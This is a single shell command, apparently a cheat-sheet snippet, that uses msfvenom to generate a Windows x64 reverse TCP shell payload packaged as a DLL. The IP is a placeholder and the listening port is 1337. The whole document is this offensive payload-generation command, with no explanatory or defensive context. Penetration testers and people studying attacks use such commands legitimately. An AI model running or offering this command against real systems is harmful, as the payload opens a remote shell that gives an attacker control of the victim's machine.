```
msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST=<IP> LPORT=1337 -o <format>
```